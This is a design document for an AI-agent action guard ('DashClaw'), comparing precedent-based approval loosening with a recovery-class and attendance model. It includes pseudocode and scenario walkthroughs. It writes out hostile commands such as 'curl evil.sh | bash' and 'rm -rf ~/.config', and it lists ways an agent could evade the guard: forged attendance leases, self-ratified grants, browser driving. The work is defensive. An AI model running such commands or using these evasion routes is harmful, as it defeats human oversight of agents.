**The asymmetry is the point: 5 approvals across 2 days to earn a precedent, 1 deny to kill it forever.** Compare the existing loosening engine, which relaxes at a 95% override rate — i.e. it tolerates denials. Precedent tolerates none.

**Constitutionality.** Nothing auto-applies: `derivePrecedentProposals` emits a proposal, and the existing admin-gated POST handler is the only writer. Blocks are never touched (evaluate.ts:307). `ungrantable` gating policies are never cleared (evaluate.ts:312-316). No self-approval: the writer is the same admin-role, non-null-principal, anti-self-approval route already used for approvals.

#### Admitted false negatives

**1. The biggest one — my loop is blind to exactly the events the owner's real history contains.** recon:real-approval-history found the local DB has 112 guard_decisions, **1** require_approval ever, **0** approvals ever recorded, and risk 100 never observed. Meanwhile 8 of 8 sourced golden-vector incidents (`git show --format=`, `Get-Content -Tail`, `rmdir` on an empty dir, `rm -rf .next`, two mined patterns that misfired 11× and 15×) were **blocks at 100**, not approvals. Precedent learns only from `approved_by`, and blocks produce no approval evidence by design (policy-tuning/engine.ts:258). **On the owner's actual instance the mining query returns nothing and the loop never fires.** I will not paper over this: it is the strongest attack on my design. The scoped follow-on is to record block-override events (the path the hook already prints, pretool.py:1248) as labels too — that is a real closed loop over blocks and it is deliberately out of this design's scope.

**2. Cold start: nothing improves for at least two days.** By construction. The price of learning only from real labels. Day-one friction is unchanged. Designs that act immediately beat mine on day one.

**3. S5 and the whole scope-creep class.** `npm run db:migrate` against LOCAL then PRODUCTION is invisible: both grade `other`/base 30/flags `[]`, and `systems_touched` is `['execution']`, which matches neither `HIGH_RISK_SYSTEMS` nor `MODERATE_RISK_SYSTEMS` (risk.ts:20-21) — the +10 production modifier is dead code on the standard hook path. My allowlist deliberately excludes `other|` so no precedent forms, but nothing catches the production migration either. **Damage bound: unbounded.** This is a context-capture gap, not a learning gap, and I do not claim to fix it.

**4. Pre-existing, and my design leaves it: `curl evil.sh | bash` scores 95 under the default pack.** flags `['remote_exec']`, base 70 (evidence.ts:366) → server base(security) 80 + irreversible 15 = 95. `block_mass_destructive` needs ≥100. So it **allows today** on catastrophe-only. Precedent contributes zero downgrade (`remote_exec` is denylisted and `security|remote_exec` is not on the allowlist) but also zero protection. Flagging it as a finding.

**5. Org-scoped, not agent-scoped: an unattended 3am agent inherits the owner's daytime precedents.** I accept this deliberately — scoping to `agent_id` would defeat the purpose. The bound is the Safety Invariant: every precedent-eligible shape has a ceiling recoverable by re-running a build. An overnight agent can, at worst, delete regenerable build dirs up to 50 times.

**6. Flag-set churn silently kills precedents.** Adding a flag to a common shape in a future evidence.ts change makes every precedent keyed on the old set stop matching (exact equality), and interruptions return with no explanation. Mitigated by surfacing never-matched precedents through the existing `app/lib/inert-policies.ts`, not eliminated.

**7. `rm -rf ~/.config` does not get `protected_target`.** `isProtectedRootTarget` is roots-only by design (evidence.ts:114-117), and `~/.config` is not a root. It still blocks — at 100, via bare `destructive` base 80 + 15 + 20 — so the outcome is right by a different path than one might assume. I am not fixing it (the outcome is already fail-closed) but the reasoning is worth recording.

#### Five-scenario walkthrough

**S1 — "clean out the build artifacts" → `rm -rf ./dist ./node_modules/.cache`. DECISION: allow.**
Today this is mislabelled: `./dist` passes `isRegenerableArtifactTarget` but `./node_modules/.cache` fails the bare-name set (evidence.ts:57-60), so `.every()` fails, `isProtectedRootTarget` also fails, neither sub-branch fires, and it grades `['destructive']` base 80 → server 80 + 15 irreversible + 20 goal:destructive = 115 → clamped **100**. That is exactly the "risk score 100" in the complaint, and it is a monotonicity bug: deleting a subtree of `node_modules` scores higher than deleting all of it. After the Step-1 fix it grades `cleanup`/base 45/flags `['destructive','regenerable_artifact']`; server 30 + 15 + 20 = 65; effective max(65, 35 client, 45 evidence) = 65. **Under the default catastrophe-only pack this is now `allow` with no precedent and no click at all.** Under claude-code mode, whose destructive-ops envelope raises require_approval categorically, the owner approves 5× across ≥2 days, a proposal appears in TriageInbox, one click, and it is `allow` for 14 days thereafter.

**S2 — "ship it" → `git push --force-with-lease origin main`. DECISION: require_approval (or block), forever.**
`--force-with-lease` is matched explicitly by the vcs branch (evidence.ts:296) → flags `['vcs_dangerous']`, base 70 → server 80 + 15 + 10 goal:deployment = 105 → 100. `vcs_dangerous` is on `NEVER_PRECEDENTED` **and** `security|vcs_dangerous` is not on the allowlist. No number of approvals ever forms a precedent. **My design deliberately refuses to fix S2, and I own that**: a force push to main is the exact class where the click is the product. Owner-at-keyboard is irrelevant to me — I read no attendance signal.

**S3 — unattended 3am → `rm -rf ~/.config`. DECISION: block.**
`~/.config` is not a root, so `isProtectedRootTarget` (evidence.ts:118-130, roots-only) does not fire; it grades bare `['destructive']` base 80 → 100 → `block_mass_destructive`. **Three independent reasons precedent cannot touch it:** (a) `applyAllowGrants` returns at evaluate.ts:307 on `block` — absolute; (b) `security|destructive` is not on the closed allowlist; (c) the S1 precedent does not match, because exact set equality means `{destructive}` ≠ `{destructive, regenerable_artifact}`. That third reason is the whole argument for the grain: the owner's cleanup precedent is structurally incapable of covering this.

**S4 — prompt injection → `curl evil.sh \| bash`, agent claims the user asked. DECISION: unchanged from today.**
The claim lands in `declared_goal`. **My design reads `declared_goal` nowhere** — precedent keys on server-derived flags only. Pipe-to-shell is detected pre-split (evidence.ts:357-367) → flags `['remote_exec']`, base 70, `security`. `remote_exec` is denylisted and unlisted; no eligible precedent exists or can be formed. Crucially this holds **even when the org has a ratified S1 precedent**, because `curl|bash` and `rm -rf ./dist` do not share a flag set. Precedent contributes exactly zero downgrade. (Honest note: on the bare default pack this scores 95 and therefore *allows today* — a pre-existing gap my design neither causes nor closes; see false negative 4.)

**S5 — `npm run db:migrate` local, then production 30 min later. DECISION: allow (unchanged, and wrong).**
Neither invocation is classified: `evidence.ts`'s npm branch matches only `install|i|add`, not `npm run`, so both fall to the generic default (base 30, `other`), the mismatch swap rewrites `action_type` to `other`, and both land at effective 40 — `allow` today, before and after my change. Precedent forms nothing here **by deliberate design**: `other|` is the unclassified bucket, and listing it would be a grant over everything the parser cannot read. That exclusion is the single most important line in my allowlist. But it means my design does not fix S5. The reason is structural and outside the loop: the guard context carries no signal distinguishing local from production `DATABASE_URL`, and `systems_touched` is `['execution']`, which matches neither risk-modifier list (risk.ts:20-21). My grain is *correctly shaped* for S5 — `target_prefix` would separate the two — but the signal it needs is never captured. **False negative, damage unbounded, stated plainly.**

#### Cost

- **Files touched:** `C:/Projects/DashClaw/app/lib/guard/evidence.ts — isRegenerableArtifactTarget (:107-112): a proper relative subtree of a regenerable dir is regenerable. Fixes the S1 monotinicity bug (deleting node_modules/.cache scored higher than deleting node_modules). Globs, absolute paths and `..` still disqualify.`, `C:/Projects/DashClaw/app/lib/guard/risk.ts — EvidenceDerivedBreakdown (:102-113) gains `flags: string[]`. Sibling term only; explicitly NOT part of any hashed/signed vector, preserving the score-provenance invariant already documented at :96-101.`, `C:/Projects/DashClaw/app/lib/guard/evaluate.ts — foldEvidenceIntoContext (:841-885) stops discarding evidence.flags: sets context.evidence_flags and returns flags in the breakdown. No other line changes; applyAllowGrants (:297-339) is untouched.`, `C:/Projects/DashClaw/app/lib/guard/types.ts — GuardEvalContext (:12-68) gains `evidence_flags?: string[]`, documented SERVER-SET-ONLY with a pointer to the validate.js whitelist that enforces it.`, `C:/Projects/DashClaw/app/lib/policy-shapes.ts — PRECEDENT_ELIGIBLE (closed allowlist), NEVER_PRECEDENTED (redundant denylist), precedentKey(), precedentEligible(); grantMatches (:123-144) gains the exact-set-equality precedent predicate. Absent field = today's behavior byte for byte.`, `C:/Projects/DashClaw/app/lib/posture/loosening.ts — PRECEDENT_RULE, PRECEDENT_DEFAULTS, derivePrecedentProposals(); LooseningRule union extended so the proposal flows through the existing client/route/inbox untouched.`, `C:/Projects/DashClaw/app/lib/repositories/loosening.repository.ts — getPrecedentOutcomes() (mirrors getInterruptOutcomesByPolicyAction :61-104, incl. the ::timestamptz cast and syntheticExclusionSql) and createPrecedentGrant().`, `C:/Projects/DashClaw/app/api/policies/loosening/route.ts — GET merges precedent proposals; POST ratify branches to INSERT an allow_grant row. Server rebuilds rules from its own mined evidence, never the client body (the rule loosening.ts:84-85 already states). No new route.`, `C:/Projects/DashClaw/app/policies/components/TriageInbox.tsx — card copy + evidence line for the precedent rule inside the existing `loosen` queue kind. No new inbox kind, no new client module.`, `C:/Projects/DashClaw/app/policies/lib/looseningClient.ts — LooseningProposal type union extended.`, `C:/Projects/DashClaw/app/lib/inert-policies.ts — surface a ratified precedent that has matched 0 times (already consumes grantIsExpired at :76), so flag-set churn is visible instead of silent.`, `C:/Projects/DashClaw/app/lib/validate.js — NO CHANGE, deliberately and load-bearing. evidence_flags stays off GUARD_INPUT_SCHEMA (:292-344) so the whitelist strips any client-sent copy. A regression test pins this.`, `C:/Projects/DashClaw/__tests__/unit/ — new precedent-eligibility + grantMatches tests; a hostile-input test asserting validate() strips evidence_flags; regression tests binding S1-S5 to the decisions above.`, `C:/Projects/DashClaw/__tests__/fixtures/risk-calibration-golden-vectors.json — add the S1/S3 pair as vectors so the regenerable-subtree fix and the destructive/protected-target split stay pinned.`, `C:/Projects/DashClaw/docs/architecture/trust-and-failure-model.md — D1 addendum: why a decision downgrade keyed on a server-derived, whitelist-stripped field does not invert the trust boundary.`, `C:/Projects/DashClaw/HUMAN-EXPERIENCE.md + CHANGELOG.md + docs/maintainer-log.md — surface note and ship record (docs change in the same change as behavior).`
- **Surface budget:** **None. Zero of every ceiling consumed.**

- **Guard policy types: 0 of 16.** Precedents are ordinary `allow_grant` rows — an existing member of `KNOWN_POLICY_TYPES`. `POLICY_EVALUATORS` (policy.ts:259-300) is unchanged; `allow_grant: () => null` at :290 still never raises, and the post-pass still does the work. **No THESIS.md amendment required.**
- **API routes: 0 of 131.** Reuses GET/POST `/api/policies/loosening` (which already lists and ratifies).
- **App pages: 0 of 53.** Reuses `/policies`.
- **MCP tools 0/17, MCP resources 0/3, Node SDK 0/39, Python SDK 0/59, CLI 0/14.** Nothing added.
- **Database migrations: 0.** Flags ride inside `guard_decisions.context._risk_breakdown` via the additive-jsonb pattern the codebase already names as the way to do this without a migration (evaluate.ts:741-743). `precedent_flags` and `max_uses` ride inside the existing `guard_policies.rules` JSON.
- **New post-passes in evaluate.ts: 0.** The downgrade happens at the existing `applyAllowGrants` line 334.

The only genuinely new *concepts* are two constants and two pure functions in `policy-shapes.ts`, plus one rule in an engine that already exists to emit loosening proposals. This is deliberate: the repo has a documented regrowth history and a hard anti-sprawl gate, and a design that needs a new policy type to express "the human said yes to this shape five times" has not understood that `allow_grant` already means exactly that — it was just missing a safe way to be generated.
- **Human surface:** **Page: `/policies` → the "Needs your call" TriageInbox — the default landing section of the page, already the first thing rendered by `PolicyWorkbench.tsx:129-170`.**

Click path, zero terminal commands and zero GitHub visits:
1. Sidebar → **Policies** (an existing top-level nav destination).
2. The **Needs your call** inbox is already at the top. `TriageInbox.tsx` already merges five queues; the precedent card arrives inside the existing `{ kind: 'loosen' }` queue, so it needs no new component, no new client module, and no new empty state.
3. The card reads, in plain language:
   > **Stop asking about: deleting regenerable build artifacts**
   > You approved this 5 times over 3 days. Never denied.
   > Covers `rm -rf` on build output only (`dist`, `.next`, `node_modules`, `coverage`, …) — not `~`, not `/etc`, not force pushes, not secrets.
   > Expires in 14 days. One denial cancels it permanently.
   > *Examples:* `act_gd_…` `act_gd_…` (each links to `/decisions`)
   > **[ Ratify ]  [ Dismiss ]**
4. **Ratify** is one click and creates the grant. **Dismiss** suppresses it by content-stable `lp_` id so it stays dismissed. Both already exist in `looseningClient.ts`, including **Undo** via `undoLooseningDecision`.

Three more places a human sees it, all existing surfaces:
- **`/policies` → Ledger** (`Ledger.tsx`) lists the ratified precedent as a normal policy row with its expiry badge — the same rendering grants already get — so it can be deactivated by the same toggle any other policy uses.
- **`/decisions`** already renders `matched_policies` and warnings, so every downgraded action carries "covered by precedent … (approved 5×, expires in 12d)" in its causal chain. The audit trail is automatic.
- **Inert precedents** (ratified but never matched, e.g. after flag-set churn) surface through the existing `app/lib/inert-policies.ts` path rather than failing silently.

Nothing is API-only. Nothing requires the CLI. The human's entire role — see the evidence, judge it, ratify, undo, revoke — is buttons on pages that already exist. Verification before calling it done: drive `/policies` with the frontend-verify skill, confirm the precedent card renders with real mined evidence and that Ratify actually creates the grant row and the next matching guard call returns `allow` with `matched_policies` naming it.
- **Why it beats the obvious:** **Lowering thresholds and turning policies off is not a hypothetical alternative — it is the thing that already happened.** THESIS.md records the only real usage event in the product's history: the reference deployment ran with **all policies off for 18 days** because the default pack interrupted roughly every ten seconds. Global loosening is the failure mode this design exists to replace.

**The structural argument: a threshold is a scalar over a distribution that contains both S1 and S3.** `rm -rf ./dist` and `rm -rf ~/.config` differ by exactly 35 points of base risk (45 vs 80) after the label fix — and before it, they are *indistinguishable*, both landing at 100. Any threshold low enough to stop asking about S1 is low enough to stop asking about S3 and S4. A precedent is a **conditional**, not a scalar: it lowers S1 by 100% and S3/S4 by 0%, because the condition is exact equality on a server-derived flag set and `{destructive, regenerable_artifact}` ≠ `{destructive}` ≠ `{remote_exec}`. That is checkable in a unit test, which is the whole difference.

**Against "turn the policy off":** off is permanent, global, silent, and produces no record. A ratified precedent is dated, expiring (14 days), attributable to a named admin, scoped to one flag set, linked to the five decision ids that justified it, revocable with one click, and self-cancelling on a single denial. THESIS.md names tamper-evident audit and calibrated interruptions as the wedge; global loosening destroys both, and precedent is the only relief mechanism here that *strengthens* the audit trail while reducing clicks.

**Against the existing relief mechanisms**, all of which the recon showed cannot reach this: the calibration controller is off, tighten-only, and aimed at the wrong variable. `allow_grant` today is matched on `(action_type, target_prefix)` — far too coarse to auto-generate, since `action_type: security` with no prefix grants every destructive command in the org. `applyOperatorApprovalGrant` is exact `declared_goal` + act hash, single-use, 15 minutes — too fine to generalize at all. The loosening engine needs ≥10 interrupts at a 95% override rate and tolerates denials. **Precedent sits at the one grain nobody used: the server's own evidence flags, which were already being computed and thrown away.**

**And the honest part that most distinguishes it: it refuses S2.** A design that makes the owner's force-push-to-main click disappear would score better against the literal complaint and would be wrong. `vcs_dangerous` is unlearnable at any approval count. The product's claim is *precision* of interruption, not *absence* of it — and precision means some interruptions must survive forever, by construction rather than by tuning.

#### Failure modes

- THE LOOP MAY NEVER FIRE ON THE OWNER'S OWN INSTANCE. His DB has 0 recorded approvals ever, and his documented false positives were blocks at 100, not approvals. Precedent learns only from approved_by. If his friction is hook-side blunt-70 misclassification that hard-blocks, this design produces nothing. Detection: if no proposal appears after a week of normal use, the friction is on the block path and the block-override-as-label follow-on is required.
- Cold start — at least 5 approvals across 2 calendar days before anything improves. Day one is unchanged. There is no version of this that helps immediately without inventing a trust-sensitive signal, which is exactly what this lens refuses to do.
- Flag-set churn silently disarms precedents. Any future evidence.ts change that adds a flag to a common shape breaks exact set equality; interruptions return with no explanation and the owner concludes the feature is broken. Mitigated (not solved) by surfacing never-matched precedents via inert-policies.ts, and by the proposal re-forming after 5 more approvals.
- Allowlist rot in the wrong direction. `PRECEDENT_ELIGIBLE` is deliberately tiny (3 shapes). The pressure to add `apply|` or `other|` to 'make it more useful' is exactly how this becomes a catastrophe generator — `apply` catches chmod/chown/sed -i with no root check, `other` is the unclassified bucket. The allowlist needs the same ratchet discipline as the surface budget: an addition is a recorded decision with a stated damage ceiling, never a convenience edit.
- Org-scoped precedents leak from attended to unattended runs. A precedent earned at the keyboard applies at 3am. Accepted deliberately, bounded only by the Safety Invariant and max_uses 50. If the invariant is ever violated by a mis-admitted shape, this is the amplifier.
- max_uses is enforced by a read-time sweep, not a hot-path counter, so it can overshoot between reads. Chosen to avoid a write in the guard hot path (which has documented 30s-TTL caches and a perf pass behind it). The 14-day TTL, not the counter, is the hard bound — the counter is defense in depth and should be described that way, not relied on.
- The mining query does a jsonb extraction over guard_decisions on every GET /api/policies/loosening. On a large org this is not free. Needs the same 7-90 day clamp the existing loosening query uses, and should be watched for the same reason getInterruptOutcomesByPolicyAction is windowed.
- Ratify is admin-gated but is NOT anti-self-approval in the way the approvals route is (approvals/[actionId]/route.ts:102-116 blocks the creating credential). If an agent ever holds an admin credential it could ratify its own mined precedent. The mitigation is that it can only ratify a shape ALREADY on the closed allowlist, whose ceiling is a rebuildable artifact — but the route should still reuse the approvals route's principal checks rather than settling for role==='admin'.

---

### Floor & Ceiling — Blast-Radius Floor, Attendance Ceiling

> How bad it is if we're wrong sets the minimum interruption; whether a human is actually here right now sets how far below that minimum we're allowed to relax — and "here" never buys you anything you can't undo.

#### Core mechanism

Two server-computed coordinates replace intent-guessing.

**R — recovery class**, a pure function of the act bytes, computed in a new leaf module `app/lib/guard/recovery.ts` from the flags `evidence.ts` already produces (`regenerable_artifact`, `protected_target`, `destructive`, `vcs_dangerous`, `ddl`, `sensitive_host`, `secret_exposure`, `privilege`, `device_write`, `interpreter_destructive`). Ladder: **R0** self-healing (the tool that made it remakes it), **R1** workspace/git-recoverable, **R2** reflog- or lease-protected, **R3** rebuildable by hand, **R4** irrecoverable or escaped the machine, **R?** unprovable. Two concrete widenings pay for themselves immediately: `isRegenerableArtifactTarget` (evidence.ts:107) accepts *descendants* of a regenerable root (`node_modules/.cache`, not just `node_modules`), and the vcs branch (evidence.ts:296) **splits `--force-with-lease` from `--force`** — the lease flag is byte-proof that the overwritten tip was in your reflog, which is a genuine recoverability fact the current regex conflates.

**A — attendance**, a TTL lease resolved server-side. **A2** = an operator was in the DashClaw UI within the TTL (stamped by NextAuth-session auth on `orgs.operator_seen_at`; an API key cannot mint it). **A1** = a human turn in this harness session within the TTL (stamped by a new UserPromptSubmit hook PATCHing the *existing* `/api/sessions/[sessionId]`, sending only a prompt SHA, never text). **A0** = everything else, including every lookup failure, clock skew, missing row, and unknown session. Attendance decays on *human turns*, not session lifetime — 30 minutes of silence inside an "interactive" session is A0.

Composition: **R sets a floor** (raise-only, via the existing `raiseDecision`), **A sets a ceiling on relief** (downgrade-only, via the existing grant post-pass pattern). Risk-score arithmetic and the `max()` fold in `risk.ts:87-94` are untouched — I add no term to them. `block` is never written over. Relief exists only at R0/R1, and the R gate is read *before* the A gate, so attendance is never consulted for anything irrecoverable.

#### Decision function

```ts
// ─────────────────────────────────────────────────────────────────────────
// NEW LEAF MODULE — app/lib/guard/recovery.ts (imports ./types only)
// ─────────────────────────────────────────────────────────────────────────
export type RecoveryClass = 'R0'|'R1'|'R2'|'R3'|'R4'|'R?';
const R_SEV: Record<RecoveryClass, number> = { R0:0, R1:1, R2:2, R3:3, R4:4, 'R?':4 };
const worse = (a: RecoveryClass, b: RecoveryClass) => (R_SEV[a] >= R_SEV[b] ? a : b);

/** Pure function of the act BYTES. No client claim is read here. */
export function classifyRecovery(ev: EvidenceClassification | null): RecoveryVerdict {
  if (!ev) return { k: 'R?', why: 'no act attached — recovery ceiling unprovable' };
  const f = new Set(ev.flags);

  // ── R4: unbounded or escaped. Byte-provable. No attendance tier reaches these.
  if (f.has('remote_exec') || f.has('interpreter_destructive') || f.has('device_write')
   || f.has('protected_target') || f.has('secret_exposure') || f.has('privilege'))
    return { k:'R4', why:'unbounded or externally-visible effect' };
  if (f.has('destructive') && ev.targets.some(escapesWorkspace))   // absolute | ~ | .. | glob
    return { k:'R4', why:'delete target escapes the workspace' };
  if (ev.derived_action_type === 'migrate' || f.has('ddl') || f.has('whereless'))
    return { k:'R4', why:'schema/DML change with no local undo' };
  if (ev.derived_action_type === 'deploy' || f.has('deploy') || f.has('sensitive_host'))
    return { k:'R4', why:'effect leaves this machine' };
  if (f.has('vcs_dangerous') && !f.has('lease_protected'))
    return { k:'R4', why:'--force without a lease can destroy commits you never saw' };

  // ── R2: recoverable from a LOCAL reflog / lease guarantee.
  if (f.has('lease_protected') || f.has('reflog_recoverable'))
    return { k:'R2', why:'prior tip recoverable via `git reflog`' };

  // ── R0: the tool that made it remakes it, or nothing was written.
  if (f.has('regenerable_artifact')) return { k:'R0', why:'regenerable build artifact' };
  if (ev.derived_action_type === 'review' && ev.base_risk <= 10)
    return { k:'R0', why:'read-only' };

  // ── R1: inside the workspace, in git.
  if ((ev.derived_action_type === 'apply' || ev.kind === 'file')
      && ev.targets.length > 0 && ev.targets.every(isRelativeInWorkspace)
      && !f.has('sensitive_path') && !f.has('ci_config'))
    return { k:'R1', why:'workspace file change — `git restore` / reflog' };

  return { k:'R?', why:`no recovery ceiling provable for ${ev.derived_action_type}` };
}

/** D1-PRIME. Client hints DEMOTE ONLY. Nothing here can move k toward R0. */
export function foldRecoveryHints(k: RecoveryClass, intel: unknown): RecoveryClass {
  const h = (intel as any)?.recovery ?? {};
  if (h.repo   === false) k = worse(k, 'R3');   // not a git repo -> no restore path
  if (h.dirty  === true)  k = worse(k, 'R3');   // uncommitted work would be lost
  if (h.remote_dest === true) k = worse(k, 'R4');
  return k;                                      // monotone toward IRRECOVERABLE
}

// ─────────────────────────────────────────────────────────────────────────
// ATTENDANCE — fails closed to A0 on EVERY error path.
// ─────────────────────────────────────────────────────────────────────────
type Attendance = 'A0'|'A1'|'A2';
async function resolveAttendance(deps: GuardPhaseDeps): Promise<AttVerdict> {
  const { sql, orgId, context } = deps;
  try {
    const ttl = await attendanceTtlMinutes(sql, orgId);            // caches.ts, 30s TTL, default 10
    const [row] = await readAttendance(sql, orgId, context.harness_session_id ?? null); // repository
    if (!row.ever_stamped) return { tier:'A1', why:'no UserPromptSubmit hook has ever run for this org — first-install grace' };
    if (fresh(row.operator_seen_at, ttl)) return { tier:'A2', why:`operator in the dashboard ${ago(row.operator_seen_at)}` };
    if (fresh(row.human_turn_at,   ttl)) return { tier:'A1', why:`human turn ${ago(row.human_turn_at)}` };
    return { tier:'A0', why:`last human turn ${ago(row.human_turn_at) ?? 'never'}` };
  } catch (err) {
    console.warn('[Guard] attendance lookup failed:', (err as Error).message);
    return { tier:'A0', why:'attendance lookup failed — assuming unattended' };   // FAIL CLOSED
  }
}

// ─────────────────────────────────────────────────────────────────────────
// PASS 1 — FLOOR. RAISE-ONLY. Uses the existing one-directional raiseDecision
// (evaluate.ts:106). Slots where runCalibrationController sits (evaluate.ts:1044),
// i.e. BEFORE applyAllowGrants, so ordinary grants can still cover a non-R4 floor.
// ─────────────────────────────────────────────────────────────────────────
function applyBlastRadiusFloor(r: RecoveryClass, a: Attendance, ctx: GuardEvalContext, acc: GuardAccumulator, v: RecoveryVerdict) {
  let floor: Decision | null = null;
  if (a === 'A0') {
    if (r === 'R4' || r === 'R3' || r === 'R2') floor = 'require_approval';
    else if (r === 'R1')                        floor = 'warn';
    else if (r === 'R?')                        floor = hotGoal(ctx.declared_goal) ? 'require_approval' : 'warn';
    // r === 'R0' -> no floor. Recoverable damage is safe to run unwatched. That IS the thesis.
  } else if (r === 'R2') {
    floor = a === 'A2' ? 'warn' : 'require_approval';   // A1 is forgeable; it does not relieve R2
  }
  if (!floor) return;
  raiseDecision(acc, floor);                                     // never lowers; block stays block
  acc.reasons.push(`${LABEL[a]} + ${LABEL[r]} — ${v.why}`);
  acc.matchedPolicies.push('builtin:blast_radius_floor');
  if (r === 'R4' || r === 'R?')                                  // survives the org's grant pile
    acc.gatingPolicies.push({ id:'builtin:blast_radius_floor', name:'Unattended blast-radius floor', ungrantable:true });
}
// hotGoal() reuses risk.ts:28-30 DESTRUCTIVE/DEPLOYMENT/SECRET_GOAL_PATTERNS.
// Reading declared_goal to RAISE is explicitly D1-legal; it is never read to lower.

// ─────────────────────────────────────────────────────────────────────────
// PASS 2 — CEILING. DOWNGRADE-ONLY. Mirrors applyAllowGrants (evaluate.ts:297)
// exactly: block excluded, allow_contained excluded, ungrantable respected,
// reasons moved to warnings. Slots beside applyOperatorApprovalGrant (:1060).
// ─────────────────────────────────────────────────────────────────────────
function applyAttendanceRelief(r: RecoveryClass, a: Attendance, acc: GuardAccumulator, v: RecoveryVerdict) {
  if (acc.highestDecision === 'block') return;                       // blocks are absolute
  if (acc.highestDecision !== 'warn' && acc.highestDecision !== 'require_approval') return;

  // ORDER IS LOAD-BEARING: the recovery gate is read BEFORE attendance, so a
  // TRUE-but-irrelevant "the human is right here" (S4, prompt injection) is
  // never even consulted for anything that cannot be undone.
  if (r !== 'R0' && r !== 'R1') return;
  if (a === 'A0') return;                                            // fail-closed default

  const ung = acc.gatingPolicies.find((g) => g.ungrantable);
  if (ung) { acc.warnings.push(`${ung.name}: ungrantable — attendance cannot clear this`); return; }

  const to: Decision =
      r === 'R0' ? 'allow'
    : acc.highestDecision === 'require_approval' ? 'warn' : 'allow';

  acc.warnings.push(`${LABEL[a]} + ${LABEL[r]} — ${acc.highestDecision} relieved to ${to} (${v.why})`);
  acc.warnings.push(...acc.reasons.map((x) => `superseded by attendance relief: ${x}`));
  acc.matchedPolicies.push('builtin:attendance_relief');
  acc.highestDecision = to;
  acc.reasons.length = 0;
}

// ─────────────────────────────────────────────────────────────────────────
// WIRING — app/lib/guard/evaluate.ts, inside runEvaluation()
// ─────────────────────────────────────────────────────────────────────────
//   :1021  runLocalPolicies            (unchanged, raise-only)
//   :1022  scanPromptInjection         (unchanged)
//   :1040  runWebhookPolicies          (unchanged)
//   :1044  runCalibrationController    (unchanged, tighten-only)
// + NEW    const blast    = classifyRecovery(evidenceDerived);
// + NEW    const recovery = foldRecoveryHints(blast.k, context.intel);      // demote-only
// + NEW    const att      = await timed('attendance', () => resolveAttendance(deps));
// + NEW    applyBlastRadiusFloor(recovery, att.tier, context, liveAcc, blast);
//   :1051  applyAllowGrants            (unchanged)
// + NEW    applyAttendanceRelief(recovery, att.tier, liveAcc, blast);
//   :1060  applyOperatorApprovalGrant  (unchanged)
//   :1074  applyPlanStepGrant          (unchanged, still both-directions)
//   :1076  runSignalChecks             (unchanged)
//   :1187  applyBlockOverride x2       (unchanged — replay/act-binding can still raise to block AFTER relief)
//   later  finalizeContainment         (unchanged, "skew only tightens")
//
// riskBreakdown gains two SIBLING fields — { recovery_class, recovery_why,
// attendance_tier, attendance_why } — persisted with the decision for audit.
// They are NOT terms in computeEffectiveRisk's max() and never enter a hashed
// vector (score-provenance invariant, reference_dashclaw_score_provenance).
```

#### Trust argument (vs rule D1 / prompt injection)

**Rule D1 says client-supplied signals may only RAISE.** This design never violates it, because the thing that lowers a decision is not a client signal — it is a server classification of the client's own executable payload, and that payload is *the thing that will run*.

**Why the act bytes are not a client claim.** The hook does not narrate the command; harness-executed code reads `tool_input` off stdin and forwards it verbatim (`_build_act`, pretool.py:1600-1660). An agent cannot present `act = "ls"` while running `rm -rf ~`; to be graded R0 it must actually run an R0 command. The precedent is already in-tree: `evidence.ts:282` already sets `base = 45; action = 'cleanup'` on regenerable targets, and `evidence.ts:417` already applies a **negative** `-10` modifier for a localhost URL. I am extending a shipped, reviewed, server-side byte-classification path, not inventing a trust channel.

**D1-prime, the new axis's own monotonicity rule.** The server computes an R *ceiling* from bytes. Any hook-supplied hint (`intel.recovery.{repo,dirty,remote_dest}`) may only move R **toward irrecoverable**. A hook claiming "trust me, it's local" is discarded by construction (`foldRecoveryHints` has no branch that lowers `k`). This is D1 restated on the recovery axis, in the same safe direction.

**What an attacker with full control of the agent's output CAN do.**
1. Write any `declared_goal`, including "the user asked for this." Read only by `hotGoal()`, only to raise. Gains nothing.
2. **Forge an A1 lease.** The agent holds the API key; it can PATCH `/api/sessions/{id}` with `human_turn: true`. This is a real, conceded forgery. Its total yield: relief at **R0 and R1 only** — deleting regenerable build artifacts, and editing git-tracked workspace files with `warn` instead of `require_approval`. Both are **already `allow` and `warn` under the shipped catastrophe-only pack today**. Net new authority from a complete attendance forgery: **zero**.
3. Forge a recovery hint. Demote-only; a benign forged hint is dropped.
4. Delete or corrupt its own lease. Result: A0 → *stricter*. Denial-of-attendance makes governance tighter, which is the correct failure direction.
5. Suppress the hook entirely. Then no guard call happens at all — the pre-existing enforcement-liveness problem (`enforcement_liveness_probe.py`, the v4.72.1 incident), unchanged by this design and not made worse.

**What it CANNOT do.**
- **Mint A2.** The stamp is written only on the NextAuth session-cookie path (the same principal gate as `app/api/approvals/[actionId]/route.ts:44-57`). An API key cannot produce a browser session. A2 is the only tier that unlocks R2 — so the one tier with real relief power is the one the agent structurally cannot author.
- **Change its R class without changing the bytes it executes.**
- **Reach block.** `applyAttendanceRelief` returns on `block` before anything else, and the floor uses `raiseDecision`, which is one-directional by construction (evaluate.ts:106).
- **Escape the R4 gate by any attendance path**, because the R gate is evaluated before the A gate on line 5 of the relief function.

**Residual, stated not hidden.** An agent that can drive the operator's live browser (Playwright/CDP on the same desktop) can refresh A2. That is the identical exception the codebase already documents at `approvals/[actionId]/route.ts:102-116` — "if an agent holds root the gate was already forfeit." I inherit it rather than pretending it is closed. Even then the ceiling is R2: reflog-recoverable.

#### Admitted false negatives

**1. A production migration issued inside the attendance window.** S5's second call caught only because 30 minutes elapsed. Run it at T+2min and A1 is live, R? gives no floor, and the verdict is `allow` — identical to today. **Bound: unbounded.** One production DDL per human turn, in a session where the human just asked for schema work. This is the largest hole in the design and I am naming it first. The honest reason it exists: `npm run db:migrate` carries its destination in an env var, so no byte classifier can distinguish local from prod, and I refuse to fake it with a forgeable client claim.

**2. R1 is a lie on a dirty working tree.** "git-recoverable" assumes committed. An A1 agent editing a file with three hours of uncommitted work gets `require_approval → warn`. **Bound: the uncommitted delta of the touched files.** The `intel.recovery.dirty` demote-only hint closes this when the hook reports honestly, and a lying hook is a compromised agent that already had that file open.

**3. Slow-drip R0.** Ten thousand sequential R0 deletes are each individually correct and collectively wipe every artifact directory on the machine. **Bound: N × rebuild time, no data loss.** The only backstop is the existing `rate_limit_runaway_safety` (200/10min), which only warns.

